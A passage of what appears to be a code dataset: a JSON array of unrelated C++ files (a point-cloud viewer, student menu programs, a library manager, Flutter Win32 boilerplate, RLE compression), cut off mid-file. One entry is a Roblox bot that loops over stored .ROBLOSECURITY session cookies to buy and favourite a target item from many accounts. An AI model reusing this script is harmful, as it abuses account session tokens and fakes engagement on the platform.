cloud\");\n  viewer->addCube (min_point_AABB.x, max_point_AABB.x, min_point_AABB.y, max_point_AABB.y, min_point_AABB.z, max_point_AABB.z, 1.0, 1.0, 0.0, \"AABB\");\n  viewer->setShapeRenderingProperties(pcl::visualization::PCL_VISUALIZER_REPRESENTATION, pcl::visualization::PCL_VISUALIZER_REPRESENTATION_WIREFRAME, \"AABB\");\n\n  Eigen::Vector3f position (position_OBB.x, position_OBB.y, position_OBB.z);\n  Eigen::Quaternionf quat (rotational_matrix_OBB);\n  viewer->addCube (position, quat, max_point_OBB.x - min_point_OBB.x, max_point_OBB.y - min_point_OBB.y, max_point_OBB.z - min_point_OBB.z, \"OBB\");\n  viewer->setShapeRenderingProperties(pcl::visualization::PCL_VISUALIZER_REPRESENTATION, pcl::visualization::PCL_VISUALIZER_REPRESENTATION_WIREFRAME, \"OBB\");\n\n  pcl::PointXYZ center (mass_center (0), mass_center (1), mass_center (2));\n  pcl::PointXYZ x_axis (major_vector (0) + mass_center (0), major_vector (1) + mass_center (1), major_vector (2) + mass_center (2));\n  pcl::PointXYZ y_axis (middle_vector (0) + mass_center (0), middle_vector (1) + mass_center (1), middle_vector (2) + mass_center (2));\n  pcl::PointXYZ z_axis (minor_vector (0) + mass_center (0), minor_vector (1) + mass_center (1), minor_vector (2) + mass_center (2));\n  viewer->addLine (center, x_axis, 1.0f, 0.0f, 0.0f, \"major eigen vector\");\n  viewer->addLine (center, y_axis, 0.0f, 1.0f, 0.0f, \"middle eigen vector\");\n  viewer->addLine (center, z_axis, 0.0f, 0.0f, 1.0f, \"minor eigen vector\");\n\n  while(!viewer->wasStopped())\n  {\n    viewer->spinOnce (100);\n    std::this_thread::sleep_for(100ms);\n  }\n\n  return (0);\n}",
    "#include \"createFile.h\"\n#include \"updateMod.h\"\n#include \"viewMod.h\"\n#include \"readwrite.h\"\n#include \"viewroad.h\"\n#include \"openmode.h\"\n#include \"rename.h\"\n\nint main() \n{\n    cout << \"**********\u6587\u4ef6\u7cfb\u7edf\u8c03\u7528\u7a0b\u5e8f*********\" << endl;\n    int choice;\n    while (true) \n    {\n        cout << \"\\n\u8bf7\u9009\u62e9\u60a8\u7684\u9009\u9879\\n\";\n        cout << \"1. \u65b0\u5efa\uff08\u4e0d\u5b58\u5728\uff09\u6216\u8005\u6253\u5f00\u6587\u4ef6\\n\";\n        cout << \"2. \u8bbe\u7f6e\u6587\u4ef6\u6253\u5f00\u6a21\u5f0f\\n\";\n        cout << \"3. \u8bfb\u6587\u4ef6\\n\";\n        cout << \"4. \u5199\u6587\u4ef6\\n\";\n        cout << \"5. \u4fee\u6539\u6587\u4ef6\u6743\u9650\\n\";\n        cout << \"6. \u67e5\u770b\u6587\u4ef6\u6743\u9650\\n\";\n        cout << \"7. \u67e5\u770b\u6587\u4ef6\u8def\u5f84\\n\";\n        cout << \"8. \u91cd\u547d\u540d\u6587\u4ef6\\n\";\n        cout << \"9. \u5173\u95ed\u6587\u4ef6\\n\";\n        cout << \"10. \u9000\u51fa\u7a0b\u5e8f\\n\";\n        cin >> choice;\n        switch (choice) \n        {\n            case 1:\n                CreateOpenFileWithMode();\n                break;\n            case 2:\n                SetOpenMode();\n                break;\n            case 3:\n                ReadFile();\n                break;\n            case 4:\n                WriteFile();\n                break;\n            case 5:\n                ModeFile();\n                break;\n            case 6:\n                ViewMode();\n                break;\n            case 7:\n                ViewRoad();\n                break;\n            case 8:\n                RenameFile();\n            case 9:\n                exit();\n                break;\n            case 10:\n                if (opened) \n                {\n                    close(fd);\n                }\n                cout << \"\u7a0b\u5e8f\u5df2\u9000\u51fa\" << endl;\n                return 0;\n            default:\n                cout << \"\u8f93\u5165\u9519\u8bef\uff01\" << endl;\n                break;\n        }\n    }\n    return 0;\n}\n",
    "#include <iostream>\n#include <cstring>\n#include <sstream>\n#include <fstream>\n#include <cpr/cpr.h>\n#include <nlohmann/json.hpp>\n#include <regex>\n\n// -- INFOS -- //\n\nstd::string RobloxUrl = \"https://www.roblox.com\";\nlong long int TargetFavoriteItem = 15556784020; // Change this with your target item's asset id (Works with games aswell but you can purchase games)\nbool IsBuyingEnabled = false; // Set it to true if you want accounts to buy it (Dont use this if the target is a game)\nlong long int TargetFavoriteItemProduct = 22; // Product id of target item\nint TargetItemPrice = 0; // Price of target item\n\n// -- Functions and Main -- //\n\nnlohmann::json ToJson(std::string JsonSource) {\n    return nlohmann::json::parse(JsonSource.c_str());\n}\n\nstd::string GetAccounts() {\n    std::ifstream file(\"Accounts.txt\");\n\n    if (!file.is_open()) {\n        std::cout << \"Error opening file\" << std::endl;\n        return \"\";\n    }\n    std::string fileContents((std::istreambuf_iterator<char>(file)),\n                            std::istreambuf_iterator<char>());\n    file.close();\n    return fileContents;\n}\n\nvoid FavTarget(long long int TargetID) {\n    std::string AccountTXT = GetAccounts();\n    std::regex pattern(\"Username: (.+)\\nCookie: (.+)\");\n    std::sregex_iterator iter(AccountTXT.begin(), AccountTXT.end(), pattern);\n    std::sregex_iterator end;\n\n    while (iter != end) {\n        std::smatch match = *iter;\n        std::string MyUser = match[1];\n        std::string Cookie = match[2];\n\n        //std::cout << Cookie << std::endl;\n\n        cpr::Session newsession;\n        newsession.SetHeader(cpr::Header{{\"Content-Type\", \"application/json\"}});\n        newsession.SetCookies(cpr::Cookies{{\".ROBLOSECURITY\", Cookie.c_str()}});\n        newsession.SetUrl(cpr::Url(\"https://auth.roblox.com/v2/logout\"));\n\n        cpr::Response resp = newsession.Post();\n\n        auto it = resp.header.find(\"x-csrf-token\");\n        if (it != resp.header.end()) {\n            newsession.UpdateHeader(cpr::Header({{\"referer\", RobloxUrl.c_str()}, {\"x-csrf-token\", it->second}}));\n        }\n\n        nlohmann::json BodyGetUserid;\n        BodyGetUserid[\"usernames\"] = {MyUser.c_str()};\n        BodyGetUserid[\"excludeBannedUsers\"] = true;\n\n        newsession.SetBody(cpr::Body(BodyGetUserid.dump()));\n        newsession.SetUrl(cpr::Url(\"https://users.roblox.com/v1/usernames/users\"));\n        \n        cpr::Response UseridResponse = newsession.Post();\n        nlohmann::json UseridJson = ToJson(UseridResponse.text);\n        long long int MyUserId = UseridJson[\"data\"][0][\"id\"];\n\n        if (IsBuyingEnabled) {\n            // Purchase the target thing\n            std::string BuyUrl = \"https://apis.roblox.com/creator-marketplace-purchasing-service/v1/products/\" + std::to_string(TargetID) + \"/purchase\";\n            nlohmann::json BuyBody;\n            BuyBody[\"expectedPrice\"] = TargetItemPrice;\n            BuyBody[\"expectedSellerId\"] = 1;\n            BuyBody[\"expectedCurrency\"] = 1;\n\n            newsession.SetUrl(cpr::Url(BuyUrl.c_str()));\n            newsession.SetBody(cpr::Body(BuyBody.dump()));\n            newsession.Post();\n        }\n\n\n        // Favorite it\n        newsession.SetBody(cpr::Body()); // Set body to nothing\n\n        std::string TargetUrl = \"https://catalog.roblox.com/v1/favorites/users/\" + std::to_string(MyUserId) + \"/assets/\" + std::to_string(TargetID) + \"/favorite\";\n        newsession.SetUrl(cpr::Url(TargetUrl.c_str()));\n\n        cpr::Response FavResponse = newsession.Post();\n\n        std::cout << FavResponse.status_code << std::endl;\n\n        iter++;\n\n        Sleep(1500); // 1.5 sec\n    }\n}\n\nint main(int, char**){\n    FavTarget(TargetFavoriteItem);\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include \"easylib.h\"\n\nusing namespace std;\n\nint main() {\n    Library library;\n    library.loadBooksFromFile(); // Load book data on startup\n    library.loadMembersFromFile(); // Load member data on startup\n\n    int choice;\n    do {\n// cout <<\"  _____                         _       _   _      \" << endl; \n// cout <<\" | ____|   __ _   ___   _   _  | |     (_) | |__   \" << endl;\n// cout <<\" |  _|    / _` | / __| | | | | | |     | | | '_ \\  \" << endl; \n// cout <<\" | |___  | (_| | \\__ \\ | |_| | | |___  | | | |_) | \" << endl; \n// cout <<\" |_____|  \\__,_| |___/  \\__, | |_____| |_| |_.__/  \" << endl;  \n// cout <<\"                       |___/                       \" << endl; \n        cout << \"\\nEasyLib - A Library Management System\" << endl;\n        cout << \"1. Add Book\" << endl;\n        cout << \"2. Issue Book\" << endl;\n        cout << \"3. Return Book\" << endl;\n        cout << \"4. Search Books\" << endl;\n        cout << \"5. Display All Books\" << endl;\n        cout << \"6. Add Member\" << endl;\n        cout << \"7. Display All Members\" << endl;\n        cout << \"8. Save Data\" << endl;\n        cout << \"0. Exit\" << endl;\n        cout << \"\\nEnter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n            case 1: library.addBook(); break;\n            case 2: library.issueBook(); break;\n            case 3: library.returnBook(); break;\n            case 4: library.searchBooks(); break;\n            case 5: library.displayAllBooks(); break;\n            case 6: library.addMember(); break;\n            case 7: library.displayAllMembers(); break;\n            case 8: library.saveBooksToFile(); library.saveMembersToFile(); break;\n            case 0: cout << \"Exiting...\\n\"; break;\n            default: cout << \"Invalid choice!\\n\";\n        }\n    } while (choice != 0);\n\n    return 0;\n}\n\n// Library member function definitions\nvoid Library::addBook() {\n    Book book;\n    cout << \"Enter Book Title: \";\n    cin.ignore(); // Clear input buffer\n    getline(cin, book.title);\n    cout << \"Enter Author: \";\n    getline(cin, book.author);\n    cout << \"Enter ISBN: \";\n    cin >> book.ISBN;\n    book.available = true;\n    books.push_back(book);\n    cout << \"Book added successfully!\\n\";\n}\n\nvoid Library::issueBook() {\n    string ISBN;\n    int memberID;\n    bool foundBook = false;\n\n    cout << \"\\nEnter ISBN of the book to issue: \";\n    cin >> ISBN;\n\n    // Find the book by ISBN\n    for (size_t i = 0; i < books.size(); ++i) {\n        if (books[i].ISBN == ISBN && books[i].available) {\n            foundBook = true;\n\n            cout << \"Enter Member ID: \";\n            cin >> memberID;\n\n            // Find the member by ID and add borrowed book ISBN\n            for (size_t j = 0; j < members.size(); ++j) {\n                if (members[j].memberID == memberID) {\n                    members[j].borrowedBooks.push_back(ISBN);\n                    books[i].available = false;  // Mark book as issued\n                    cout << \"Book issued successfully to \" << members[j].name << \".\" << endl;\n                    return;\n                }\n            }\n            cout << \"Invalid Member ID!\\n\";\n            books[i].available = true; // Revert availability change\n            return;\n        }\n    }\n\n    if (!foundBook) {\n        cout << \"Book not found or unavailable!\\n\";\n    }\n}\n\nvoid Library::returnBook() {\n    string ISBN;\n    int memberID;\n    bool foundBook = false;\n\n    cout << \"Enter ISBN of the book to return: \";\n    cin >> ISBN;\n\n    // Find the book by ISBN\n    for (size_t i = 0; i < books.size(); ++i) {\n        if (books[i].ISBN == ISBN) {\n            foundBook = true;\n            books[i].available = true;   // Mark book as available\n\n            cout << \"Enter Member ID: \";\n            cin >> memberID;\n\n            // Find the member by ID and remove borrowed book ISBN\n            for (size_t j = 0; j < members.size(); ++j) {\n                if (members[j].memberID == memberID) {\n                    vector<string>::iterator it = find(members[j].borrowedBooks.begin(), members[j].borrowedBooks.end(), ISBN);\n                    if (it != members[j].borrowedBooks.end()) {\n                        members[j].borrowedBooks.erase(it);\n                        cout << \"Book returned successfully!\\n\";\n                        return;\n                    } else {\n                        cout << \"Member has not borrowed this book!\\n\";\n                        return;\n                    }\n                }\n            }\n        }\n    }\n\n    if (!foundBook) {\n        cout << \"Book not found!\\n\";\n    }\n}\n\nvoid Library::searchBooks() {\n    string searchTerm;\n    int choice;\n\n    cout << \"Search by:\\n\";\n    cout << \"1. Title\\n\";\n    cout << \"2. Author\\n\";\n    cout << \"3. ISBN\\n\";\n    cout << \"Enter your choice: \";\n    cin >> choice;\n    if (choice > 3 || choice < 1){\n        cout << \"Invalid Choice. Please try again.\" << endl;\n    }\n    else{\n    cin.ignore(); // Cl",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"rle.h\"\n\nfloat compress(std::basic_string<char> fname, std::basic_string<char> cname) {\n    std::fstream file;            // original file\n    std::fstream compressed;      // compressed file\n    char character;          // \u0447\u0438\u0442\u0430\u0435\u043c\u044b\u0439 \u0441\u0438\u043c\u0432\u043e\u043b\n    char next_character;     // \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u0439 \u0447\u0438\u0442\u0430\u0435\u043c\u044b\u0439 \u0441\u0438\u043c\u0432\u043e\u043b\n    int fsize = 0;           // \u0440\u0430\u0437\u043c\u0435\u0440 \u0444\u0430\u0439\u043b\u0430\n    int frequency = 1;       // \u0443\u043d\u0438\u043a\u0430\u043b\u044c\u043d\u043e\u0441\u0442\u044c \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u0432\n    int write_pos = 0;\n\n    file.open(fname, std::ios::in | std::ios::ate | std::ios::binary);\n    compressed.open(cname, std::ios::out | std::ios::trunc | std::ios::binary);\n    fsize = file.tellg();\n\n    for(int i = 0; i < fsize; i++)\n    {\n        file.seekg(i, std::ios::beg);      // safety net\n        file.read((char*)&character, sizeof(char)); // \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u0442\u0435\u043a\u0443\u0449\u0438\u0439 \u0441\u0438\u043c\u0432\u043e\u043b\n        next_character = file.peek();\n\n        if(next_character != character)\n        {\n            compressed.seekp(write_pos, std::ios::beg);\n            compressed.write((char*)&frequency, sizeof(char));\n            compressed.seekp(write_pos + 1, std::ios::beg);\n            compressed.write((char*)&character, sizeof(char));\n            write_pos += 2;\n            frequency = 0;\n        }\n        frequency++;\n    }\n\n    file.close();\n    compressed.close();\n\n    return (write_pos / float(fsize));\n}\n\nvoid decompress(std::basic_string<char> fname, const std::basic_string<char> uname) {\n    std::fstream file;\n    std::fstream ufile;\n    char character;\n    int frequency = 0;\n    int fsize = 0;\n    int write_pos = 0;\n\n    file.open(fname, std::ios::ate | std::ios::in | std::ios::binary);\n    ufile.open(uname, std::ios::trunc | std::ios::out | std::ios::binary);\n    fsize = file.tellg();\n\n    for(int i = 0; i < fsize; i += 2)\n    {\n        file.seekg(i, std::ios::beg);\n        file.read((char*)&frequency, sizeof(char));\n        file.seekg(i + 1, std::ios::beg);\n        file.read((char*)&character, sizeof(char));\n\n        for(int j = 0; j < frequency; j++)\n        {\n            ufile.seekp(write_pos, std::ios::beg);\n            ufile.write((char*)&character, sizeof(char));\n            write_pos++;\n        }\n    }\n    file.close();\n    ufile.close();\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app_yesno_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\n////////////////////////////////////////////////////////////\n// Headers\n////////////////////////////////////////////////////////////\n#include <iomanip>\n#include <iostream>\n#include <cstdlib>\n\n\n////////////////////////////////////////////////////////////\n// Function prototypes\n// (I'm too lazy to put them into separate headers...)\n////////////////////////////////////////////////////////////\nvoid doClient(unsigned short port);\nvoid doServer(unsigned short port);\n\n\n////////////////////////////////////////////////////////////\n/// Entry point of application\n///\n/// \\return Application exit code\n///\n////////////////////////////////////////////////////////////\nint main()\n{\n    // Choose a random port for opening sockets (ports < 1024 are reserved)\n    const unsigned short port = 2435;\n\n    // Client or server ?\n    char who;\n    std::cout << \"Do you want to be a server ('s') or a client ('c')? \";\n    std::cin  >> who;\n\n    if (who == 's')\n    {\n        // Run as a server\n        doServer(port);\n    }\n    else\n    {\n        // Run as a client\n        doClient(port);\n    }\n\n    // Wait until the user presses 'enter' key\n    std::cout << \"Press enter to exit...\" << std::endl;\n    std::cin.ignore(10000, '\\n');\n\n    return EXIT_SUCCESS;\n}\n",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <windows.h>\n#define eps 1e-3\n\nvoid read_file(char filename[], int &n, float A[][100], int &check);\nvoid input_file(char a[], float A[][100], int &n);\nvoid change(float A[][100], float B[], int n);\nvoid print_POLYNOMIAL(float B[], int n);\nfloat Fx(float B[], int n, float x0);\nvoid enter_input(float &a, float &b, float B[], int n);\nfloat solve(float B[], float a, float b, int n);\nvoid information();\nvoid result(char a[]);\nint menu_input(int &com);\nvoid mtA(float A[][100], int &n);\nvoid setcolor(int backgound_color, int text_color);\n\nint main()\n{\n    int n,com;\n    float a, b,c;\n    char name[100], re[100], other[1],newP[1];\n    float A[100][100];\n    float B[100];\n\n    information();//Introduce the topic and related information\n   \n    do{\n       menu_input(com);\n       if(com==1){\n        setcolor(0,3);\n        printf(\"\\tMoi ban nhap ma tran A\\n\");\n        printf(\"\\tNhap buc cua ma tran: \");\n        setcolor(0,8);\n        scanf(\"%d\", &n);\n        mtA(A, n);\n       }\n       else if(com==2){\n        (getchar()) != '\\n';         \n        input_file(name,A,n);\n       }\n       \n        setcolor(0,15);\n        change(A,B,n);\n        print_POLYNOMIAL(B,n);\n         while (1){\n            enter_input(a,b,B,n);\n            c=solve(B,a,b,n);\n            setcolor(0,15);\n            printf(\"\\n    Bang gia tri thuc hien phuong phap chia doi\\n\");\n            setcolor(0,3);\n            printf(\"\\nNgiem cua phuong trinh la:  %.3f\", c);\n            printf(\"\\n\\nBan co muon nhap khoang nghiem khac khong (y/n)? \");\n            setcolor(0,8);\n            scanf(\"%s\",other);\n            if (other[0]!='y') break;\n        }\n        setcolor(0,3);\n        printf(\"\\n\\nBan co muon tim nghiem voi da thuc khac khong(Neu muon nhap lai thi chon c, con khong muon thi nhap phim bat ki)? \");\n        setcolor(0,8);\n        scanf(\"%s\", newP);\n    }while(newP[0]=='c');\n    }\n\nvoid setcolor(int backgound_color, int text_color)\n{\n    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);\n    int color_code = backgound_color * 16 + text_color;\n    SetConsoleTextAttribute(hStdout, color_code);\n}\n\nvoid information()\n{\n    int i;\n    setcolor(0, 3);\n    printf(\"\\n%9c\", 201);\n    for (i = 0; i <= 85; i++)\n        printf(\"%c\", 205);\n    printf(\"%c\", 187);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c                             DO AN LAP TRINH TINH TOAN                                %c\", 4, 4);\n    printf(\"\\n        %c                   DE TAI: Tim nghiem gan dung bang phuong phap chia doi              %c\", 4, 4);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c       Sinh vien thuc hien:                       Giao vien huong dan:                %c\", 4, 4);\n    printf(\"\\n        %c           %c Le Ngoc Lam Na                            %c Do Thi Tuyet Hoa             %c\", 4, 45, 45, 4);\n    printf(\"\\n        %c           %c Le Xuan Tung Son  %56c\", 4, 45, 4);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c\", 200);\n    for (i = 0; i <= 85; i++)\n        printf(\"%c\", 205);\n    printf(\"%c\\n\", 188);\n}\n\nvoid read_file(char filename[], int &n, float A[][100], int &check)\n{   setcolor(0,3);\n    FILE *file = fopen(filename, \"r\");\n    if (file == NULL)\n    {\n        check = 0;        \n        return;\n    }\n    fscanf(file, \"%d\", &n); // read array size\n    char a;\n    int s = 0, count = 0;\n\n    // check size file\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < n; j++)\n        {\n            if (fscanf(file, \"%f\", &A[i][j]) == 1)\n            { // save data into array A\n                s++;\n                if ((a = fgetc(file)) != '\\n')\n                {\n                    if (a != EOF)\n                        count++;\n                }\n                else\n                {\n                    break;\n                }\n            }\n        }\n        if (count != (n - 1))\n        {\n            check = 2;\n            fclose(file);\n            return;\n        }\n        count = 0;\n    }\n    if (s != n * n)\n    {\n        check = 2;\n        fclose(file);\n        return;\n    }\n    check = 1;\n    fclose;\n}\n\nvoid input_file(char a[], float A[][100], int &n)\n{   \n    setcolor(0,3);\n    int check;\n    do\n    {\n        printf(\"Nhap ten file du lieu: \");\n         setcolor(0, 8);\n        fgets(a, 100, stdin); // input name file to array a\n        a[strcspn(a, \"\\n\")] = 0;\n        setcolor(0,3);\n        read_file(a, n, A, check);\n        if (check == 0)\n        {\n            printf(\"File %s khong ton tai\\n\", a);\n        }\n        else if (check == 2)\n        {\n            printf(\"File %s bi loi \\n\", a);\n        }\n        else\n        {\n            printf(\"Doc file thanh cong\\n\");\n        }\n    } while (check == 0 || check == 2);\n}\n\nvoid change(float A[][100], float B[], int n)\n{ // data analysis\n    B[0] = 0;\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < n; j++)\n        {\n            B[i] += A[j][i];\n        }\n    }\n    float max = B[",
    "#include\"Trade.h\"\n#include \"MyWnds.h\"\n#include <CommCtrl.h>\n#include \"Data.hpp\"\n\n//\u521d\u59cb\u5316\u603b\u4e2a\u6570\u4e3a0\nUINT Trade::mCount = 0;\n\nHWND Trade::TradeInfoProc_hwnd;\nUINT Trade::TradeInfoProc_uMsg;\nWPARAM Trade::TradeInfoProc_wParam;\nLPARAM Trade::TradeInfoProc_lParam;\n\n//\u4ea4\u6613\u8bb0\u5f55\nLRESULT CALLBACK Trade::TradeInfoProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {\n\tTrade::TradeInfoProc_hwnd = hwnd;\n\tTrade::TradeInfoProc_uMsg = uMsg;\n\tTrade::TradeInfoProc_wParam = wParam;\n\tTrade::TradeInfoProc_lParam = lParam;\n\tswitch (uMsg)\n\t{\n\tcase WM_NOTIFY:\n\t\tTrade::TradeInfoProc_WM_NOTIFY();\n\t\tbreak;\n\tcase WM_PAINT:\n\t\tTrade::TradeInfoProc_WM_PAINT();\n\t\tbreak;\n\tcase WM_CREATE:\n\t\tTrade::TradeInfoProc_WM_CREATE();\n\t\tbreak;\n\tdefault://\u672a\u81ea\u5b9a\u4e49\u7684\u5176\u4ed6\u6d88\u606f\n\t\treturn DefWindowProc(hwnd, uMsg, wParam, lParam);//\u9ed8\u8ba4\u7a97\u53e3\u8fc7\u7a0b\n\t}\n\treturn 0;\n}\n\nvoid Trade::TradeInfoProc_WM_NOTIFY()\n{\n\tswitch (((LPNMHDR)Trade::TradeInfoProc_lParam)->code)\n\t{\n\tcase NM_CLICK:case NM_RETURN://\u5355\u51fb\n\t{\n\t\tswitch (LPNMHDR(Trade::TradeInfoProc_lParam)->idFrom) {\n\t\tcase dataInfoListID:\n\t\t{\n\t\t\t//\u66f4\u65b0\u70b9\u51fb\u7684\u5217\u8868\u5750\u6807\n\t\t\tMyWnds::x_Listview = LPNMITEMACTIVATE(Trade::TradeInfoProc_lParam)->iSubItem;\n\t\t\tMyWnds::y_Listview = LPNMITEMACTIVATE(Trade::TradeInfoProc_lParam)->iItem;\n\t\t\tbreak;\n\t\t}\n\t\tcase dataInfoSysLinkID:\n\t\t{\n\t\t\tif (PNMLINK(Trade::TradeInfoProc_lParam)->item.iLink == 0)//\u589e\u52a0\n\t\t\t{\n\t\t\t\tMyWnds::dialogFlag = dialogTradeAdd;\n\t\t\t\tMyWnds::Dialog();\n\t\t\t}\n\t\t\telse if (PNMLINK(Trade::TradeInfoProc_lParam)->item.iLink == 1)//\u4fee\u6539\n\t\t\t{\n\t\t\t\tif ((MyWnds::x_Listview == -1 && MyWnds::y_Listview == 0) || MyWnds::y_Listview >= ListView_GetItemCount(GetDlgItem(Trade::TradeInfoProc_hwnd, dataInfoListID))) {\n\t\t\t\t\tMessageBox(Trade::TradeInfoProc_hwnd, _T(\"\u8bf7\u9009\u62e9\u8981\u4fee\u6539\u7684\u4ea4\u6613\u8bb0\u5f55\"), _T(\"\u63d0\u793a\"), MB_ICONINFORMATION);\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tMyWnds::dialogFlag = dialogTradeModify;\n\t\t\t\t\tMyWnds::Dialog();\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (PNMLINK(Trade::TradeInfoProc_lParam)->item.iLink == 2)//\u5220\u9664\n\t\t\t{\n\t\t\t\tTCHAR tempTCHAR[21] = {};\n\t\t\t\tif (MessageBox(Trade::TradeInfoProc_hwnd, _T(\"\u786e\u5b9a\u8981\u5220\u9664\u8fd9\u4e9b\u4ea4\u6613\u8bb0\u5f55\u5417\uff1f\"), _T(\"\u63d0\u793a\"), 